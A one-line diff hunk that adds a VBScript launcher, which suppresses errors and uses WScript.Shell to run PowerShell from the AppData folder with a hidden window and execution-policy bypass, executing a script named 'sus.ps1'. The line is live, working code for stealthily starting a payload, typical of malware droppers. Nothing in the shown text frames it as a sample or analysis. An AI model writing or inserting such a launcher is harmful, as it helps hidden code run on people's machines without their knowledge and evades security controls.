@@ -1,0 +1,1 @@
+On Error Resume Next:Set oShell = CreateObject("WScript.Shell"):tmp1="powershell cd $env:appdata;powershell -windowstyle hidden -executionpolicy bypass -file ""./sus.ps1""":retu=oShell.run(tmp1,0,false)
